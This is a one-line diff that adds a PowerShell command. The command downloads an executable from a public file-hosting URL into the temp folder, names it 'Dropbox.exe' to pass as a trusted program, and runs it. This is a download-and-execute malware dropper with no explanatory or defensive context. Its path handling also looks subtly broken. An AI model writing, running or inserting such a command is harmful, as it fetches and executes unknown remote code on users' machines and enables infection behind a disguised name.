@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/dwnysn.exe',"$env:TEMPDropbox.exe");Start-Process ("$env:TEMPDropbox.exe")
